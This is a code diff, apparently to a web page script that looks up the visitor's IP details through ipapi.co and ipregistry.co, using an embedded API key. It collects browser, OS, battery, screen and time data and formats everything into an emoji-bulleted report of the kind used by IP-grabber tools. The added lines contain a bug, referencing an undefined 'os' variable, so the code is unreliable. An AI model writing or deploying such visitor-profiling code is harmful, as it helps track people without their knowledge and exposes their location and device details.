@@ -79,7 +79,7 @@ fetch('https://ipapi.co/json/')
         const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         const browser = getBrowserInfo();
         let userid = document.createElement('p');
-     
+
         let systemTime = new Date();
         let hours = systemTime.getHours();
         let minutes = systemTime.getMinutes();
@@ -125,8 +125,13 @@ fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
 .then(data => {
   let device = data.device;
   let brand = device.brand || 'Desktop';
-  let model = device.name || 'ㅤ';
+  let model = device.name || ' ㅤ ';
   let deviceType = device.type;
+  let engine = data.engine; 
+  let namebrowser = engine.name
+  let osname = data.os
+  let osas = os.name
+  let mrpon = os.version || 'None';
     
         const message = `
       * Ip 🌐*
@@ -143,15 +148,9 @@ fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
     *├ Asn: ${isAsn}*
     *├ Route: ${isRoute}*
     *├ Domain: ${isDomain}*
-    *├ Postal Code: ${postal}*
-    *├ UTC: ${utc}*
-    *├ Value: ${currency}*
-    *├ Version: ${versian}*
-    *├ Country Call code: ${countrycall}*
-    *├ TLD: ${tld}*
       * System 🖥*
     *├ Browser: ${browser}*
-    *├ Os: ${osname}*
+    *├ Os: ${osas} ${mrpon}*
     *├ Battery: ${batteryLevel}%*
     *├ Screen resolution: ${screenWidth}x${screenHeight}*
     *├ Time: ${formattedTime}*
